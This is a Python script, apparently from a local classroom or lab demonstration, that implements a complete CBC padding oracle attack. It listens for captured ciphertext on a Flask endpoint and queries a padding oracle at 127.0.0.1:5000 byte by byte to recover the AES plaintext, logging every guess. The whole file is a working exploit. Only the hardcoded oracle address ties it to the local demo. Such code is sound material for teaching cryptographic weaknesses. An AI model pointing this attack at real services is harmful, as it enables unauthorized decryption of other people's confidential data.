#!/usr/bin/env python3
"""
Padding Oracle Attacker
Run in Terminal 2. Receives ciphertext from the sender,
then decrypts it using the CBC padding oracle attack.
Prints each step: every byte guess that gets a 'valid' response from the oracle.
"""

import threading
import logging
import time
from flask import Flask, request, jsonify
import requests as http_req

# --- Hardcoded values ---
BLOCK_SIZE = 16                        # AES block size: 16 bytes (128 bits)
ORACLE_URL = "http://127.0.0.1:5000/oracle"
LISTEN_PORT = 5001

# --- Flask app to receive ciphertext ---
app = Flask(__name__)
logging.getLogger("werkzeug").setLevel(logging.ERROR)

captured_event = threading.Event()
captured_ct = {"hex": None}


@app.route("/capture", methods=["POST"])
def capture():
    data = request.get_json(force=True)
    ct_hex = data.get("ciphertext", "")
    if ct_hex:
        captured_ct["hex"] = ct_hex
        captured_event.set()
    return jsonify({"status": "ok"})


# --- Helper functions ---

def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


def split_blocks(data):
    return [data[i:i+BLOCK_SIZE] for i in range(0, len(data), BLOCK_SIZE)]


def ask_oracle(two_blocks):
    """Send 2 blocks to the server, get back True (padding valid) or False."""
    try:
        resp = http_req.post(ORACLE_URL, json={"ciphertext": two_blocks.hex()}, timeout=10)
        return resp.json().get("valid", False)
    except Exception:
        return False


# --- The attack ---

def padding_oracle_attack(ct_hex):
    data = bytes.fromhex(ct_hex)
    blocks = split_blocks(data)
    num_ct_blocks = len(blocks) - 1   # first block is the IV

    print("\n" + "=" * 50)
    print("  PADDING ORACLE ATTACK")
    print("=" * 50)
    print(f"  Ciphertext (hex) : {ct_hex}")
    print(f"  Total length     : {len(data)} bytes")
    print(f"  Block size       : {BLOCK_SIZE} bytes")
    print(f"  Blocks           : 1 IV + {num_ct_blocks} ciphertext")
    print(f"  Padding method   : PKCS#7")
    print(f"  Oracle URL       : {ORACLE_URL}")
    print("=" * 50)

    query_count = 0
    all_plaintext = b""
    start = time.time()

    for blk_num in range(1, len(blocks)):
        prev_block = blocks[blk_num - 1]
        target_block = blocks[blk_num]
        intermediate = bytearray(BLOCK_SIZE)

        print(f"\n--- Block {blk_num} of {num_ct_blocks} ---")
        print(f"  Previous block (hex): {prev_block.hex()}")
        print(f"  Target block   (hex): {target_block.hex()}")

        # recover each byte from right (position 15) to left (position 0)
        for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
            target_padding = BLOCK_SIZE - byte_pos   # the padding value we want

            # prepare the crafted block
            crafted = bytearray(BLOCK_SIZE)
            for k in range(byte_pos + 1, BLOCK_SIZE):
                crafted[k] = intermediate[k] ^ target_padding

            found = False
            for guess in range(256):
                crafted[byte_pos] = guess
                forged = bytes(crafted) + target_block
                query_count += 1
                valid = ask_oracle(forged)

                if valid:
                    # for the last byte, confirm it is really 0x01 padding
                    if byte_pos == BLOCK_SIZE - 1:
                        check = bytearray(crafted)
                        check[byte_pos - 1] ^= 0x01
                        query_count += 1
                        if not ask_oracle(bytes(check) + target_block):
                            continue   # false positive, keep trying

                    intermediate[byte_pos] = guess ^ target_padding
                    pt_byte = prev_block[byte_pos] ^ intermediate[byte_pos]
                    char = chr(pt_byte) if 32 <= pt_byte < 127 else "."

                    print(f"  Byte {BLOCK_SIZE - byte_pos:2d}/16 | "
                          f"guess=0x{guess:02x} | "
                          f"oracle=VALID | "
                          f"intermediate=0x{intermediate[byte_pos]:02x} | "
                          f"plaintext byte=0x{pt_byte:02x} ('{char}') | "
                          f"queries so far={query_count}")
                    found = True
                    break

            if not found:
                print(f"  FAILED at byte position {byte_pos}")
                return

        pt_block = xor_bytes(prev_block, bytes(intermediate))
        all_plaintext += pt_block
        print(f"  Block {blk_num} plaintext (hex): {pt_block.hex()}")

    elapsed = time.time() - start

    # strip PKCS#7 padding
    raw = all_plaintext
    pad_byte = raw[-1]
    if 1 <= pad_byte <= BLOCK_SIZE and raw[-pad_byte:] == bytes([pad_byte] * pad_byte):
        plaintext = raw[:-pad_byte]
        print(f"\nPKCS#7 padding: last {pad_byte} byte(s) are 0x{pad_byte:02x}, stripped.")
    else:
        plaintext = raw
        print(f"\nNo valid PKCS#7 padding found, returning raw bytes.")

    try:
        text = plaintext.decode()
    except UnicodeDecodeError:
        text = plaintext.hex()

    print("\n" + "=" * 50)
    print("  RESULT")
    print("=" * 50)
    print(f"  Decrypted text : {text}")
    print(f"  Hex            : {plaintext.hex()}")
    print(f"  Total queries  : {query_count}")
    print(f"  Time           : {elapsed:.2f}s")
    print("=" * 50 + "\n")


def main():
    # start flask in background
    t = threading.Thread(
        target=lambda: app.run(host="127.0.0.1", port=LISTEN_PORT, threaded=True),
        daemon=True,
    )
    t.start()

    print("=" * 50)
    print("  ATTACKER — PADDING ORACLE")
    print("=" * 50)
    print(f"  Block size  : {BLOCK_SIZE} bytes")
    print(f"  Padding     : PKCS#7")
    print(f"  Oracle URL  : {ORACLE_URL}")
    print(f"  Listening   : port {LISTEN_PORT}")
    print("=" * 50)
    print("\nWaiting for ciphertext from sender...\n")

    while True:
        captured_event.wait()
        captured_event.clear()

        ct_hex = captured_ct["hex"]
        print(f"Ciphertext received: {ct_hex}")

        padding_oracle_attack(ct_hex)

        print("Waiting for next ciphertext...\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nBye.")
